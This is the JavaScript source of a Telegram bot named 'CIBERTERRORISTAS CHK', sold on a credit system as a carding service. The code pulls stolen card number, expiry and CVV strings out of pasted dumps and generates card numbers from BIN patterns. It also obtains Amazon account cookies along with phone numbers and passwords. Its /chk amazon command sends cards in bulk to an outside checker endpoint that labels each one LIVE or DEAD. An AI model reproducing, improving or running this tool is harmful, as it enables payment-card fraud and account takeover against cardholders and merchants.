// ============================================
// BOT DE TELEGRAM - CIBERTERRORISTAS CHK
// Versión corregida: usa telegram_id y API interna
// ============================================

const TelegramBot = require('node-telegram-bot-api');
const { pool } = require('./database');

// ========== CONFIGURACIÓN ==========
const token = process.env.TELEGRAM_BOT_TOKEN;
const INTERNAL_API_URL = process.env.INTERNAL_API_URL; // API interna
const BOT_API_KEY = process.env.BOT_API_KEY;
const API_GENCOOKIE_URL = process.env.API_GENCOOKIE_URL;

if (!token) {
    console.error('❌ ERROR: TELEGRAM_BOT_TOKEN no configurado');
    process.exit(1);
}

if (!INTERNAL_API_URL) {
    console.error('❌ ERROR: INTERNAL_API_URL no configurada');
    process.exit(1);
}   

if (!BOT_API_KEY) {
    console.error('❌ ERROR: BOT_API_KEY no configurada');
    process.exit(1);
}       

if (!API_GENCOOKIE_URL) {
    console.error('❌ ERROR: API_GENCOOKIE_URL no configurada');
    process.exit(1);
}

const bot = new TelegramBot(token, { polling: true });
console.log('🤖 Bot de Telegram inicializado');

// ========== FUNCIONES AUXILIARES ==========

// Obtener usuario por telegram_id
async function getUserByTelegramId(telegramId) {
    const res = await pool.query(
        'SELECT id, username, credits, days_remaining FROM users WHERE telegram_id = $1',
        [telegramId]
    );
    return res.rows[0];
}

// Crear o actualizar usuario (usa telegram_id como clave)
async function upsertUser(telegramId, username, chatId, chatType) {
    const now = new Date();
    if (chatType === 'private') {
        await pool.query(
            `INSERT INTO users (telegram_id, telegram_username, telegram_chat_id, username, created_at)
             VALUES ($1, $2, $3, $4, $5)
             ON CONFLICT (telegram_id) DO UPDATE 
             SET telegram_chat_id = $3, telegram_username = $2, username = $4, updated_at = $5`,
            [telegramId, username, chatId, username, now]
        );
    } else {
        // En grupos no guardamos chat_id (para no mezclar)
        await pool.query(
            `INSERT INTO users (telegram_id, telegram_username, username, created_at)
             VALUES ($1, $2, $3, $4)
             ON CONFLICT (telegram_id) DO UPDATE 
             SET telegram_username = $2, username = $3, updated_at = $4`,
            [telegramId, username, username, now]
        );
    }
}

// Descontar créditos llamando a la API interna
async function deductCredits(telegramId, amount = 3) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000);
        const response = await fetch(`${INTERNAL_API_URL}/user/bot/use-credits`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                telegram_id: telegramId,
                amount: amount,
                bot_key: BOT_API_KEY
            }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        if (data.success) return data.newCredits;
        else return null;
    } catch (error) {
        console.error('Error en deductCredits:', error);
        return null;
    }
}

// Verificar créditos llamando a la API interna
async function checkCredits(telegramId, required = 3) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000);
        const response = await fetch(`${INTERNAL_API_URL}/user/bot/check-credits`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                telegram_id: telegramId,
                bot_key: BOT_API_KEY
            }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        if (data.success && data.credits >= required) return true;
        return false;
    } catch (error) {
        console.error('Error en checkCredits:', error);
        return false;
    }
}

// ========== LIMPIADOR DE TARJETAS (extrae formato 16|MM|AAAA|CVV) ==========
function limpiarTarjetas(textoSucio) {
    const textoLimpio = textoSucio
        .replace(/\u200b/g, '')
        .replace(/[\u2060\u200C\u200D\uFEFF]/g, '')
        .replace(/\s+/g, ' ')
        .replace(/\[ShadowChk\] CC Storage \| /g, '')
        .replace(/\[mastercard.*?\]/g, '')
        .replace(/\[.*?\]/g, '')
        .replace(/\(.*?\)/g, '')
        .trim();
    const patron = /(\d{16})\s*[|│]\s*(\d{2})\s*[|│]\s*(\d{4})\s*[|│]\s*(\d{3})/g;
    const tarjetas = [];
    let match;
    while ((match = patron.exec(textoLimpio)) !== null) {
        const [_, num, mes, año, cvv] = match;
        if (num.length === 16 && mes.length === 2 && año.length === 4 && cvv.length === 3) {
            tarjetas.push(`${num}|${mes}|${año}|${cvv}`);
        }
    }
    return [...new Set(tarjetas)];
}

// ========== VERIFICACIÓN DE TARJETAS EN AMAZON ==========
async function verificarTarjetasAmazon(tarjetas, cookies) {
    const resultados = [];
    for (const card of tarjetas) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 30000);
            const response = await fetch(`https://p01--amazonchk--vwr6mdxp7dhn.code.run/api/check-card`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ card, cookies }),
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            const data = await response.json();
            resultados.push({ card, status: data.status, message: data.message });
        } catch (error) {
            resultados.push({ card, status: 'ERROR', message: error.message });
        }
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    return resultados;
}

// ========== COMANDOS ==========

// /start – Vincular cuenta y mostrar estado
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from;
    const telegramId = from.id;
    const username = from.username || telegramId.toString();
    const firstName = from.first_name || '';
    const chatType = msg.chat.type;

    try {
        const existing = await getUserByTelegramId(telegramId);
        const isNew = !existing;

        await upsertUser(telegramId, username, chatId, chatType);

        if (isNew) {
            const mensaje = 
                `👋 ¡Hola ${firstName}! 👋\n\n` +
                `He guardado tu ID de Telegram: <code>${telegramId}</code>\n\n` +
                `Ahora puedes registrarte en la web:\n` +
                `https://ciber7erroristaschk.com/login.html\n\n` +
                `Usa tu usuario: @${username}\n` +
                `Recibirás el código aquí.\n\n` +
                `👾 ¡Te esperamos!`;
            await bot.sendMessage(chatId, mensaje, { parse_mode: 'HTML' });
        } else {
            const servicios = 
                `✅ *Servicios activos:*\n` +
                `• Amazon (/chk amazon + tarjetas)\n` +
                `• Generador de cookies (/gencookie MX)\n` +
                `• Extrapolador (/extrapolador 123456)\n` +
                `• Generador de tarjetas (/gen patrón)\n` +
                `• Limpiador de texto (/limpiador)\n`;
            const mensaje = 
                `👋 ¡Hola ${firstName}!\n\n` +
                `💰 *Créditos:* ${existing.credits}\n` +
                `📅 *Días:* ${existing.days_remaining}\n\n` +
                `${servicios}\n` +
                `Usa /menu para más comandos.`;
            await bot.sendMessage(chatId, mensaje, { parse_mode: 'Markdown' });
        }
    } catch (error) {
        console.error('Error en /start:', error);
        await bot.sendMessage(chatId, '❌ Error interno.');
    }
});

// /gencookie <país>
bot.onText(/\/gencookie\s+(\w+)/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    const country = match[1].toUpperCase();
    const paisesValidos = ['MX', 'US', 'CA', 'UK', 'DE', 'FR', 'IT', 'ES', 'JP', 'AU', 'IN'];
    if (!paisesValidos.includes(country)) {
        return bot.sendMessage(chatId, `❌ País inválido. Usa: ${paisesValidos.join(', ')}`);
    }
    try {
        const user = await getUserByTelegramId(telegramId);
        if (!user) return bot.sendMessage(chatId, '❌ Usa /start primero.');
        if (user.credits < 3) return bot.sendMessage(chatId, '❌ Créditos insuficientes (3).');

        await bot.sendMessage(chatId, `🔄 Generando cookie para ${country}...`);
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 120000);
        const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ country, add_address: true }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        if (data.success && data.data) {
            const { phone, password, cookie_string, country: ctry } = data.data;
            const newCredits = await deductCredits(telegramId, 3);
            if (newCredits === null) throw new Error('No se pudieron descontar créditos');
            const msgText = `🍪 *Cookie ${ctry}*\n📞 Teléfono: \`${phone}\`\n🔑 Pass: \`${password}\`\n🍪 Cookie:\n\`\`\`\n${cookie_string}\n\`\`\`\n💰 Créditos restantes: ${newCredits}`;
            await bot.sendMessage(chatId, msgText, { parse_mode: 'Markdown' });
        } else {
            throw new Error(data.error || 'Error');
        }
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// /gen <patrón> [cantidad]
bot.onText(/\/gen\s+([^\s|]+\|\d{2}\|\d{2,4})(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    let patron = match[1];
    let cantidad = match[2] ? parseInt(match[2]) : 10;
    if (cantidad > 50) cantidad = 50;
    try {
        // Implementación básica (puedes mejorarla)
        const partes = patron.split('|');
        let [numBase, mes, año] = partes;
        const cvv = partes[3] || 'rnd';
        mes = mes.padStart(2, '0');
        año = año.length === 2 ? `20${año}` : año;
        const tieneX = numBase.includes('X');
        const digitosFijos = numBase.replace(/X/g, '');
        const cantidadX = (numBase.match(/X/g) || []).length;
        const tarjetas = [];
        for (let i = 0; i < cantidad; i++) {
            let num = digitosFijos;
            for (let j = 0; j < cantidadX; j++) num += Math.floor(Math.random() * 10);
            if (num.length < 16) num = num.padEnd(16, '0');
            if (num.length > 16) num = num.slice(0, 16);
            const cvvGen = cvv === 'rnd' ? Math.floor(100 + Math.random() * 900).toString() : cvv;
            tarjetas.push(`${num}|${mes}|${año}|${cvvGen}`);
        }
        const lista = tarjetas.slice(0, 20).map((t, i) => `${i+1}. \`${t}\``).join('\n');
        const resto = tarjetas.length > 20 ? `\n... y ${tarjetas.length-20} más` : '';
        await bot.sendMessage(chatId, `🎴 *Tarjetas (${tarjetas.length}):*\n${lista}${resto}`, { parse_mode: 'Markdown' });
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// /limpiador – Extraer tarjetas de texto sucio
bot.onText(/\/limpiador/, async (msg) => {
    const chatId = msg.chat.id;
    await bot.sendMessage(chatId, '📝 Envía el texto sucio:');
    const listener = async (responseMsg) => {
        if (responseMsg.chat.id === chatId && responseMsg.text && !responseMsg.text.startsWith('/')) {
            const tarjetas = limpiarTarjetas(responseMsg.text);
            if (tarjetas.length === 0) {
                bot.sendMessage(chatId, '❌ No se encontraron tarjetas.');
            } else {
                const lista = tarjetas.slice(0, 30).map((t, i) => `${i+1}. \`${t}\``).join('\n');
                bot.sendMessage(chatId, `🔍 *Tarjetas (${tarjetas.length}):*\n${lista}`, { parse_mode: 'Markdown' });
            }
            bot.removeListener('message', listener);
        }
    };
    bot.on('message', listener);
});

// /extrapolador <bin>
bot.onText(/\/extrapolador\s+(\d{6})/, async (msg, match) => {
    const chatId = msg.chat.id;
    const bin = match[1];
    await bot.sendMessage(chatId, `🔍 Búsqueda para BIN ${bin} (próximamente).`);
    // Aquí conectarías con tu servicio de extrapolador
});

// /chk amazon – Verificar tarjetas en Amazon
bot.onText(/\/chk\s+amazon(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let rawText = match[1];
    if (!rawText) {
        await bot.sendMessage(chatId, '📝 Envía las tarjetas (pueden estar en texto sucio):');
        const listener = async (responseMsg) => {
            if (responseMsg.chat.id === chatId && responseMsg.text && !responseMsg.text.startsWith('/')) {
                await procesarChkAmazon(chatId, telegramId, responseMsg.text);
                bot.removeListener('message', listener);
            }
        };
        bot.on('message', listener);
        return;
    }
    await procesarChkAmazon(chatId, telegramId, rawText);
});

async function procesarChkAmazon(chatId, telegramId, rawText) {
    try {
        const tarjetas = limpiarTarjetas(rawText);
        if (tarjetas.length === 0) return bot.sendMessage(chatId, '❌ No se encontraron tarjetas válidas.');
        if (tarjetas.length > 20) return bot.sendMessage(chatId, `⚠️ Máximo 20 tarjetas (tienes ${tarjetas.length}).`);
        const user = await getUserByTelegramId(telegramId);
        if (!user) return bot.sendMessage(chatId, '❌ Usa /start primero.');
        if (user.credits < 1) return bot.sendMessage(chatId, '❌ Necesitas 1 crédito para verificar.');
        const newCredits = await deductCredits(telegramId, 1);
        if (newCredits === null) return bot.sendMessage(chatId, '❌ Error al descontar créditos.');
        await bot.sendMessage(chatId, '🔑 Ahora envía la cookie de Amazon (puedes obtenerla con /gencookie).');
        const cookieListener = async (cookieMsg) => {
            if (cookieMsg.chat.id === chatId && cookieMsg.text && !cookieMsg.text.startsWith('/')) {
                const cookies = cookieMsg.text.trim();
                await bot.sendMessage(chatId, `🔍 Verificando ${tarjetas.length} tarjetas...`);
                const resultados = await verificarTarjetasAmazon(tarjetas, cookies);
                let resumen = `📊 *Resultados* (Créditos restantes: ${newCredits})\n\n`;
                for (const r of resultados) {
                    const emoji = r.status === 'LIVE' ? '✅' : (r.status === 'DEAD' ? '❌' : '⚠️');
                    resumen += `${emoji} \`${r.card}\` → ${r.status}\n${r.message ? `   ${r.message}\n` : ''}`;
                }
                await bot.sendMessage(chatId, resumen, { parse_mode: 'Markdown' });
                bot.removeListener('message', cookieListener);
            }
        };
        bot.on('message', cookieListener);
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
}

// /creditos
bot.onText(/\/creditos|\/credits|\/saldo|\/dias/, async (msg) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    try {
        const user = await getUserByTelegramId(telegramId);
        if (!user) return bot.sendMessage(chatId, '❌ Usa /start primero.');
        await bot.sendMessage(chatId, `💰 *Créditos:* ${user.credits}\n📅 *Días:* ${user.days_remaining}`, { parse_mode: 'Markdown' });
    } catch (error) {
        bot.sendMessage(chatId, '❌ Error.');
    }
});

// /renovar
bot.onText(/\/renovar/, async (msg) => {
    const chatId = msg.chat.id;
    const adminUser = 'C1ber7errorist4sBot';
    await bot.sendMessage(chatId, `🔄 *Renovación*\nContacta a [@${adminUser}](https://t.me/${adminUser})`, { parse_mode: 'Markdown', disable_web_page_preview: true });
});

// /id
bot.onText(/\/id/, async (msg) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    await bot.sendMessage(chatId, `📋 *Tu ID:* \`${telegramId}\``, { parse_mode: 'Markdown' });
});

// /help
bot.onText(/\/help/, async (msg) => {
    const chatId = msg.chat.id;
    const helpText = 
        `📖 *Comandos:*\n` +
        `/start - Vincular cuenta\n` +
        `/gencookie MX (o US,CA...) - Generar cookie (3 créditos)\n` +
        `/gen 549949056298xxxx|05|2029 [cantidad] - Generar tarjetas\n` +
        `/limpiador - Extraer tarjetas de texto sucio\n` +
        `/extrapolador 123456 - Buscar por BIN\n` +
        `/chk amazon [texto] - Verificar tarjetas (1 crédito)\n` +
        `/creditos - Ver saldo\n` +
        `/renovar - Contactar soporte\n` +
        `/id - Ver ID\n` +
        `/help - Esta ayuda`;
    await bot.sendMessage(chatId, helpText, { parse_mode: 'Markdown' });
});

// /menu – Menú interactivo (opcional)
bot.onText(/\/menu/, async (msg) => {
    const chatId = msg.chat.id;
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🍪 Generar Cookie', callback_data: 'menu_gencookie' }],
                [{ text: '🎴 Generar Tarjetas', callback_data: 'menu_gen' }],
                [{ text: '🧹 Limpiador', callback_data: 'menu_limpiador' }],
                [{ text: '🔍 Verificar Amazon', callback_data: 'menu_chk' }],
                [{ text: '💰 Créditos', callback_data: 'menu_creditos' }]
            ]
        }
    };
    await bot.sendMessage(chatId, '📋 *Menú principal*', { parse_mode: 'Markdown', ...opts });
});

bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const data = callbackQuery.data;
    let respuesta = '';
    switch (data) {
        case 'menu_gencookie': respuesta = 'Usa `/gencookie MX` (o US, CA...). Cuesta 3 créditos.'; break;
        case 'menu_gen': respuesta = 'Usa `/gen 549949056298xxxx|05|2029 15`'; break;
        case 'menu_limpiador': respuesta = 'Usa `/limpiador` y luego envía el texto sucio.'; break;
        case 'menu_chk': respuesta = 'Usa `/chk amazon` y luego envía las tarjetas (texto sucio).'; break;
        case 'menu_creditos': respuesta = 'Usa `/creditos` para ver tu saldo.'; break;
        default: respuesta = 'Opción no válida.';
    }
    await bot.sendMessage(chatId, respuesta, { parse_mode: 'Markdown' });
    await bot.answerCallbackQuery(callbackQuery.id);
});

console.log('✅ Bot de Telegram listo');